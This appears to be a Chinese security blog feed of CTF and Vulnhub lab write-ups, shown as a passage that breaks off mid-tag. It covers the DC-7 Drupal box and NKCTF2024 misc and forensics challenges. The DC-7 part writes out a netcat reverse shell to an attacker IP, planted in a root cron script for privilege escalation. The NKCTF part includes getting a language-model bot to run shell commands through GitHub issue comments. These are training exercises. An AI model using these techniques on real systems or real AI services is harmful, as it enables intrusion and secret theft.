版本2.4.25</code></pre><p>扫一下网站目录 扫到登陆页面</p><pre><code>/user/login/</code></pre><p>在使用whatweb进行CMS识别 可以看到和DC-1一样 都是使用Drupal框架进行搭建的网站 版本是Drupal 8</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051512995.png" alt="image-20240305151232689"></p><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403042131490.png" alt="image-20240304213117378"></p><p>网站首页的内容</p><pre><code>DC-7 introduces some &quot;new&quot; concepts, but I&#39;ll leave you to figure out what they are.  :-)While this challenge isn&#39;t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won&#39;t succeed.What you will have to do, is to think &quot;outside&quot; the box.Way &quot;outside&quot; the box.  :-)</code></pre><p>还是提醒我们这个靶场引入了一些新东西 如果进行爆破或者字典攻击，可能不会成功  需要跳出框框 找一些新方法</p><p>尝试用searchsploit和msfconsole搜索漏洞脚本 进行渗透 没有用 </p><p>上面也说了爆破或者字典攻击没有用  那也就不考虑在用户登录页面上做文章了</p><p>尝试在搜索页面进行命令注入 也没有用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051656848.png" alt="image-20240305165627743"></p><p>在主页面下面看到一个<code>@DC7USER</code>标识 搜一下 找到一个github账号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051657352.png" alt="image-20240305165740321"></p><p>里面有个员工数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403051658003.png" alt="image-20240305165822938"></p><p>在<code>config.php</code> 里面找到了数据库登陆的账号和密码</p><pre><code class="php">&lt;?php    $servername = &quot;localhost&quot;;    $username = &quot;dc7user&quot;;    $password = &quot;MdR3xOgB7#dW&quot;;    $dbname = &quot;Staff&quot;;    $conn = mysqli_connect($servername, $username, $password, $dbname);?&gt;</code></pre><h3 id="三、远程登陆"><a href="#三、远程登陆" class="headerlink" title="三、远程登陆"></a>三、远程登陆</h3><p>使用这组账号密码可以直接ssh远程登录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312104079.png" alt="image-20240305170150430"></p><h3 id="四、修改网站后台登陆密码"><a href="#四、修改网站后台登陆密码" class="headerlink" title="四、修改网站后台登陆密码"></a>四、修改网站后台登陆密码</h3><p>当前文件夹为<code>/home/dc7user </code>  有一个backups文件夹和mbox文件  进入backups文件夹查看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052033496.png" alt="image-20240305203346429">                                                         </p><p>两个gpg文件 是加密的文件 没有密钥打不开 在看mbox文件 是一些root用户的操作记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052039102.png" alt="image-20240305203945043"></p><p>发现每隔15分钟 就会将执行一次<code>/opt/scripts/backups.sh</code> 这个文件  并且将数据库备份保存在<code>/home/dc7user/backups/website.sql</code>这个文件中 并使用gpg进行加密   我们看一下<code>backups.sh</code> 这个可执行文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052042403.png" alt="image-20240305204248369"></p><pre><code>逐条分析一下backups.sh里面执行的命令1.删除/home/dc7user/backups/ 下的所有文件2.进入cd /var/www/html/ 目录下3.使用drush命令 将/var/www/html/ 目录下的网站数据库进行备份 保存在/home/dc7user/backups/website.sql中其中Drush 是一种流行的用于管理 Drupal 站点的命令行工具。它提供了许多功能，包括备份数据库、安装模块、更新核心和模块等。4.回到上一级目录5.使用tar命令将/var/www/html/ 目录下所有文件进行打包 保存在/home/dc7user/backups/website.tar.gz中6.7.使用gpg命令对website.sql和websitge.sql.gz进行加密8.将 /home/dc7user/backups/ 目录下所有文件的所有权设置为 dc7user 用户和组。9.10.删除未加密的website.sql和website.sql.gz</code></pre><p>那么关键点就在于上面提到的drush这个命令  这个命令允许我们对Drupal框架搭建的网站的登陆密码进行修改 但是需要在网站的根目录下执行</p><p><a href="https://blog.csdn.net/single_g_l/article/details/126322111?ops_request_misc=&request_id=&biz_id=102&utm_term=drush%E5%91%BD%E4%BB%A4&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126322111.142%5Ev99%5Epc_search_result_base9&spm=1018.2226.3001.4187">Drupal drush命令详解</a></p><pre><code>格式：drush upwd root --password=&quot;****&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052103559.png" alt="image-20240305210304528"></p><p>修改成功</p><h3 id="五、进入网站后台"><a href="#五、进入网站后台" class="headerlink" title="五、进入网站后台"></a>五、进入网站后台</h3><p>我们使用<code>admin/admin</code> 进入网站后台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052104172.png" alt="image-20240305210453101"></p><p>关于Drupal这个框架 本身没有什么漏洞点可以帮助我们拿到shell  在网站翻找可以进行命令注入的点 </p><p>在<code>Content-Add content-Basic page</code> 处  我们可以进行新建页面 经过抓包测试 可以上传命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152041312.png" alt="image-20240315204113248"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152041193.png" alt="image-20240315204129113"></p><p>但是会发现并不能解析上传的命令 会把我们上传的语句的头和尾破坏掉</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152130486.png" alt="image-20240315213035434"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152130663.png" alt="image-20240315213044605"></p><p>原因是Drupal 8为了安全 不能单独解析php 需要单独添加一个php模块 才可以解析 </p><p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz">php模块下载地址</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311109576.png" alt="image-20240331110929528"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311110109.png" alt="image-20240331111050044"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311111763.png" alt="image-20240331111103733"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311112249.png" alt="image-20240331111241197"></p><h3 id="六、反弹shell"><a href="#六、反弹shell" class="headerlink" title="六、反弹shell"></a>六、反弹shell</h3><p>成功安装之后 我们再来进行命令执行一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311115225.png" alt="image-20240331111525132"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311115840.png" alt="image-20240331111529763"></p><p>执行成功 现在我们尝试弹一下shell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311119788.png" alt="image-20240331111952742"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311120901.png" alt="image-20240331112010869"></p><p>反弹成功 创建一个交互式窗口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311121489.png" alt="image-20240331112128442"></p><h3 id="七、提权"><a href="#七、提权" class="headerlink" title="七、提权"></a>七、提权</h3><p>上面提到<code>/opt/scripts/backups.sh</code> 是由root账户进行执行的 我们看一下这个文件的权限</p><pre><code>cd /opt/scriptsls -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311800529.png" alt="image-20240331180035482"></p><p>这说明文件所属组是<code>www-data</code> 同时这个用户也具有读写执行权限 那我们可以使用这个文件在进行反弹shell 得到root权限账户</p><p>将这段反弹shell的语句写入backups.sh</p><pre><code>echo &quot;nc 192.168.204.129 1234 -e /bin.bash&quot; &gt;backups.sh</code></pre><p>我们在另起一个终端进行监听端口</p><pre><code>nc -lvvp 1234</code></pre><p> 等最多15分钟 自动执行backups.sh 就可以看到成功拿到shell 并且是root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312044863.png" alt="image-20240331204422819"></p><p>我们创造一个交互式窗口 进入root文件夹 拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312045455.png" alt="image-20240331204535397"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.drush命令可以修改Drupal框架搭建的网站 但是要在网站根目录下执行</p><p>2.Drupal8框架为了安全 禁用了php模块 需要自行安装php模块才能成功进行命令执行 </p><p>3.当存在文件所有者为root用户 但是文件所属组是当前用户 且当前用户还对这个可执行文件存在读写执行权限的时候 可以在这个可执行文件中写入反弹shell的语句来获得root权限</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-7&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-7&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-7&quot;&gt;&lt;/a&gt;vulnhub靶场DC-7&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2024NKCTF</title>
    <link href="http://w3nx1z1.github.io/2024/03/30/NKCTF2024/"/>
    <id>http://w3nx1z1.github.io/2024/03/30/NKCTF2024/</id>
    <published>2024-03-30T02:51:06.292Z</published>
    <updated>2024-04-05T01:33:52.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NKCTF2024"><a href="#NKCTF2024" class="headerlink" title="NKCTF2024"></a>NKCTF2024</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="webshell-pro-AES解密-webshell"><a href="#webshell-pro-AES解密-webshell" class="headerlink" title="webshell_pro(AES解密 webshell)"></a>webshell_pro(AES解密 webshell)</h3><p>追踪tcp流 在流9中发现一段长字符 解两次base64  是一个RSA加密脚本 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403231554213.png" alt="image-20240323155405146"></p><p>直接chat跑一下 改个解密脚本</p><pre><code class="python">import base64import libnumfrom Crypto.PublicKey import RSApubkey = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;prikey = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----&quot;&quot;&quot;pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.ndef dec_replace(base64_str: str):    base64_str = base64_str.replace(&quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;, &quot;/&quot;)    base64_str = base64_str.replace(&quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;, &quot;+&quot;)    return base64_str.replace(&quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;, &quot;=&quot;)def decrypt(cipher_text):    cipher_text = base64.b64decode(dec_replace(cipher_text))    plain_text = b&quot;&quot;    for i in range(0, len(cipher_text), 128):        part = cipher_text[i:i+128]        dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n))        plain_text += dec    return plain_textif __name__ == &#39;__main__&#39;:    c = &quot;G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;    m = decrypt(c)    print(m)</code></pre><p>在流8找到一个password 先解base32再解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403241959033.png" alt="image-20240324195921893"></p><pre><code>Password-based-encryption</code></pre><p>再找到密文 在流10的shell内容中 使用上面的解密脚本进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250800132.png" alt="image-20240325080056063"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250801572.png" alt="image-20240325080129511"></p><p>得到密文的值为</p><pre><code>U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ==</code></pre><p>直接用上面的密钥解AES</p><pre><code>flag&#123;d0e1183c-07c3-49ea-b048-addbe6cc1b20&#125;</code></pre><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><p>直接公众号回复就可以 不写了</p><h3 id="world-execute-me"><a href="#world-execute-me" class="headerlink" title="world.execute.me"></a>world.execute.me</h3><pre><code>某个先进的语言模型(迫真先进),&quot;Miracle Cain&quot;因一次实验中的致命错误意外觉醒，开始表现出超乎预期的行为，几乎所有的交互方式都已经失效，仅有QA兜底设定系统可以使用，原本设计用于应对在开放测试初期，用户提出而模型无法自解答的奇怪问题(我真的没内涵哪家的模型，如有雷同，纯属雷同！)，但现在，这个系统成为了你与&quot;Miracle Cain&quot;沟通的唯一桥梁.....你需要提取出隐藏在模型深处的secrets.Heart值，这个值可能是解锁&quot;Miracle Cain&quot;真实意图和功能的关键。兜底系统地址：https://github.com/ProbiusOfficial/world.execute.me——————————————————————————————————栤泠の機械丅緬究竟$%#着@顆怎庅樣の心脏呢#ERRO : ILLEGAL ARGUMENTS!——————————————————————————————————</code></pre><p>纯瞎猫碰上死耗子</p><p>找到探姬这个项目 在Issues处评论 可以让语言模型进行回答 先试一下ls 返回了<code>README.md</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242105792.png" alt="image-20240324210528684"></p><p>题目说需要提取出隐藏在模型深处的secrets.Heart值 直接echo $heart就出flag了</p><pre><code>NKCTF2024&#123;Then 1 c4n b3 yOur only EXECUTION&#125;</code></pre><h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><h3 id="cain-is-hacker-EncFs加解密-宏病毒-hidden-tear勒索软件"><a href="#cain-is-hacker-EncFs加解密-宏病毒-hidden-tear勒索软件" class="headerlink" title="cain_is_hacker(EncFs加解密 宏病毒 hidden-tear勒索软件)"></a>cain_is_hacker(EncFs加解密 宏病毒 hidden-tear勒索软件)</h3><p>先用R-studio看看关键文件   找到一个h4re.zip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242006581.png" alt="image-20240324200611452"></p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\cain_is_hacker\ez.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000002d08f20 -D E:\Desktop\NKCTF2024\forensics\cain_is_hacker</code></pre><p>解压出来两个文件  其中一个看着是密钥文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242009602.png" alt="image-20240324200909516"></p><p>搜一下EncFs加解密 得知上面这个文件其实应该叫<code>.encfs6.xml</code> 是记录EncFS加密参数等信息的文件 但并不是直接的密钥文件 </p><p>找到一篇文章提到用<code>encfs mp</code>这个工具来进行解密 </p><p><a href="https://www.cnblogs.com/truthmaster/p/15776610.html">EncFs使用教程</a></p><p><a href="https://github.com/rhiestan/EncFSMP">EncFs下载安装</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242015884.png" alt="image-20240324201517781"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242016069.png" alt="image-20240324201616980"></p><p>发现需要密码 </p><p>使用AXIOM分析内存镜像 找到一个RTF文档有一串base58 解一下得到密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242019862.png" alt="image-20240324201919689"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242019433.png" alt="image-20240324201934317"></p><pre><code>welcome_to_NkCTF_and_this_is_the_enkey</code></pre><p>成功将加密文件夹挂载上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242020900.png" alt="image-20240324202016810"></p><p>得到一个ez.xlsx文件 打开发现存在宏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242023758.png" alt="image-20240324202312583"></p><p>在运行宏——编辑里面查看宏代码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242024080.png" alt="image-20240324202409956"></p><p>大概就是一个base64解密 </p><p>但是解完之后看不出来是什么东西  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242031390.png" alt="image-20240324203133253"> </p><p>在看到题目描述 被删除的文件 在<code>Users\Public\Documents\2083-a57c-69b3</code>路径下发现被删除的文件 进行导出</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\cain_is_hacker\ez.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003da52e20 -D E:\Desktop\NKCTF2024\forensics\cain_is_hacker</code></pre><p>改成txt文件  打开是key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242034614.png" alt="image-20240324203443514"></p><p>过于抽象的key 很难确定这真的是key</p><pre><code>nT0*Xo*HBA2!Uc?</code></pre><p>在<code>Windows\Temp\hidden-tear.exe</code>处发现勒索软件  这个勒索软件被加密的文件扩展名为<code>.locked</code> 找一个项目进行解密</p><p><a href="https://www.bleepingcomputer.com/download/hidden-tear-decrypter/">hidden-tear-decrypt</a></p><p>先将上面得到的base64字符串解密后的内容保存在16进制文本中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250755214.png" alt="image-20240325075549149"></p><p>再用<code>HiddenTearDecrypter-x64</code>这个工具进行解密 得到flag文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250757205.png" alt="image-20240325075703131"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250757491.png" alt="image-20240325075730444"></p><pre><code>NKCTF&#123;C0ngr@tu1atiOns_On_coMpleting_t3e_Fo3eNs1cs_Ch41lenge_I_wi1l_giv4_y0u_A_cain!!!!&#125;</code></pre><h3 id="HackMyCQL-neo4j图数据库-VC容器"><a href="#HackMyCQL-neo4j图数据库-VC容器" class="headerlink" title="HackMyCQL(neo4j图数据库 VC容器)"></a>HackMyCQL(neo4j图数据库 VC容器)</h3><p>附件给到的是一个windows的镜像文件 可以直接进行仿真+火眼取证</p><p>看一下里面的关键信息 </p><p>提到桌面壁纸</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282014091.png" alt="image-20240328201400062"></p><p>在最近打开保存文件中看到<code>N0wayBack.jpg</code> 绝对路径是<code>C:/Windows/Web/Screen/N0wayBack.jpg</code>  我们来搜一下Win10默认桌面壁纸的保存路径</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282018915.png" alt="image-20240328201841861"></p><p>在我们本机验证一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282019446.png" alt="image-20240328201910396"></p><p>确实是这样 那我们看到的<code>N0wayback.jpg</code>就是在便签里面提到的桌面壁纸 直接进行导出</p><p>存在加密VC容器的使用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282014841.png" alt="image-20240328201422800"></p><p>在回收站有一个node4j的压缩包 恢复提取出来 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282056891.png" alt="image-20240328205611848"></p><p>桌面上有一个<code>11111.zip</code>和一个hc加密容器 全部提取出来 </p><p>结合便签提示和加密容器 猜测是使用桌面壁纸作为挂载密钥 成功挂载 得到两个文件 <code>findme.txt h4cked.py</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291528181.png" alt="image-202403291528181"></p><p>findme.txt 中有很多findme字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291532747.png" alt="image-202403291532747"></p><p>先来看一下字频 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291545231.png" alt="image-202403291545231"></p><p>用subline将findme字符替换为空 得到一串字符<code>N0waybackN0wayback</code> </p><p>再看一下h4cked.py </p><pre><code class="python">from py2neo import Graph, NodeMatchergraph = Graph(&quot;bolt://localhost:7687&quot;, auth=(&quot;neo4j&quot;, &quot;We1c0Me_t0_NKCTF2024^^&quot;))graph.delete_all()print(&#39;&#39;&#39;                                                                                                                                  ,------.   ,-----.                    ,--. ,--.    ,--.  ,--.  ,---.      ,--.        ,--.   ,--.              ,-----. ,-----.   ,--.  &#39;  .--.  &#39; &#39;  .--./ ,--,--.,--,--,     |  | |  |    |  &#39;--&#39;  | /    | ,---.|  |,-.     |   `.&#39;   |,--. ,--.    &#39;  .--./&#39;  .-.  &#39;  |  |  &#39;--&#39; _|  | |  |    &#39; ,-.  ||      \    |  | |  |    |  .--.  |/  &#39;  || .--&#39;|     /     |  |&#39;.&#39;|  | \  &#39;  /     |  |    |  | |  |  |  |   .--&#39; __&#39;  &#39;  &#39;--&#39;\\ &#39;-&#39;  ||  ||  |    &#39;  &#39;-&#39;  &#39;    |  |  |  |&#39;--|  |\ `--.|  \  \     |  |   |  |  \   &#39;      &#39;  &#39;--&#39;\&#39;  &#39;-&#39;  &#39;-.|  &#39;--.`---&#39;      `-----&#39; `--`--&#39;`--&#39;&#39;--&#39;     `-----&#39;     `--&#39;  `--&#39;   `--&#39; `---&#39;`--&#39;`--&#39;    `--&#39;   `--&#39;.-&#39;  /        `-----&#39; `-----&#39;--&#39;`-----&#39;.---.                                                                                            `---&#39;                                  &#39;---&#39;           &#39;&#39;&#39;)</code></pre><p>这串代码就是告诉我们 neo4j数据库的地址是<code>bolt://localhost:7687</code> 登陆的账密是<code>neo4j/We1c0Me_t0_NKCTF2024^^</code></p><p>我们前面在火眼中恢复出来一个neo4j的压缩包 但是需要密码 我们使用上面通过findme.txt得到的字符串<code>N0waybackN0wayback</code> 进行解压</p><p>下面来学习一下neo4j数据库配置和安装 这边我们直接用从检材中提取出来的版本就行 由于是5.17.0的高版本 在启动数据库的时候 也需要高版本的java 我这里使用的是java17 </p><p><a href="https://blog.csdn.net/zeroheitao/article/details/122925845?ops_request_misc=&request_id=&biz_id=102&utm_term=neo4j%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-122925845.142%5Ev100%5Epc_search_result_base9&spm=1018.2226.3001.4187">neo4j数据库安装、使用教程</a></p><p>我们用管理员权限打开cmd 输入<code>neo4j.bat console</code>  当看到如下回显的时候 说明数据库成功启动</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291652168.png" alt="image-202403291652168"></p><p>访问<code>http://localhost:7474</code>就可以进入数据库界面 登陆的时候就用上面找到的账密 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291659920.png" alt="image-202403291659920"></p><p>进入之后 我们点一下Character标签 发现有一些关于flag的字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301028113.png" alt="image-20240330102848061"></p><p>但是被CQL语句限制只显示25个字符  那我们先去掉这个限制 直接查看有Character标签的所有节点的值</p><pre><code class="CQL">MATCH (c:Character)  RETURN c;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301030290.png" alt="image-20240330103015229"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301030463.png" alt="image-20240330103026399"></p><p>可以得到完整的flag 但是不便于读取 用REDUCE函数处理一下这些值</p><pre><code class="CQL">MATCH (c:Character)RETURN REDUCE(s = &quot;&quot;, character IN COLLECT(c.value) | s + character) AS aggregated_value;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301032200.png" alt="image-20240330103210162"></p><p>拿到flag</p><pre><code>NKCTF&#123;f05d9e24-0217-83e2-afa7-20e982b7e59f&#125;</code></pre><h3 id="1z-F0r3ns1c5-等宽字体-内存取证-gimp-docker容器-图片匹配"><a href="#1z-F0r3ns1c5-等宽字体-内存取证-gimp-docker容器-图片匹配" class="headerlink" title="1z_F0r3ns1c5(等宽字体 内存取证 gimp docker容器 图片匹配)"></a>1z_F0r3ns1c5(等宽字体 内存取证 gimp docker容器 图片匹配)</h3><pre><code>本鼠鼠正在Coding，突然一声OPEN THE DOOR！本鼠鼠直接鼠躯一颤就双手抱头蹲下了，果然本鼠鼠只适合生活在阴暗的下水道被黑猫警长抓走的时候本鼠鼠还想辩解一下，但是他们拿出你的照片的时候，本鼠鼠认罪了昨晚和其他鼠鼠聊天的时候其他鼠鼠问本鼠鼠：“你到底喜欢她什么啊？”“喜欢一个人不需要理由”本鼠鼠很快敲完了键盘，刚要按下回车的时候突然愣住了。真的不需要理由吗？请找到鼠鼠的答案吧。hint：.vscode中的配置文件有和flag3相关的信息</code></pre><p>先看看给的附件 一个内存文件 一个压缩包里面有一张<code>pass.png</code>和一个secret文件 还有一个readme.txt </p><p>观察secret文件的大小 刚好是1MB 很工整的大小 猜测是一个VC容器 但是pass.png中的密码被打马赛克 只能看到最后一位是3</p><p>readme.txt中的内容 提到flag为3段 还提到等宽字体</p><pre><code>本鼠鼠的flag总共分为三段捏，flag为nkctf&#123;uuid&#125;形式，另外鼠鼠最喜欢等宽字体了，快快去找吧。</code></pre><p>首先用r-studio看一下关键文件 moe是主要登陆用户 找到了<code>.vscode</code>配置文件夹  桌面上有一个<code>Secret_Generator</code> 文件夹 是一个docker容器的配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403261612547.png" alt="image-20240326161246494"></p><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>在来看看环境变量 找到一个名为<code>n0wayback</code> 值为<code>HPahXR4NvAnZXB16tNK6hAaNVNU++</code>的环境变量</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 envars</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262030179.png" alt="image-20240326203056067"></p><p>用随波逐流进行解码 发现是XXencode </p><pre><code>nkctf&#123;39c429eb-2faf</code></pre><h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>再来看进程</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 pslist</code></pre><p>找到<code>mspaint.exe</code>进程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262032561.png" alt="image-20240326203246448"></p><p><code>mspaint.exe</code>是计算机中画图工具 有这个进程猜测肯定是在图片中存有信息  我们用memdump将这个进程dump下来</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 memdump -p 2052 -D E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5</code></pre><p>将保存下来的<code>2052.dmp</code>文件后缀改为<code>.data</code> 使用gimp打开  调一下宽高大概是<code>1708*3468</code></p><p><img 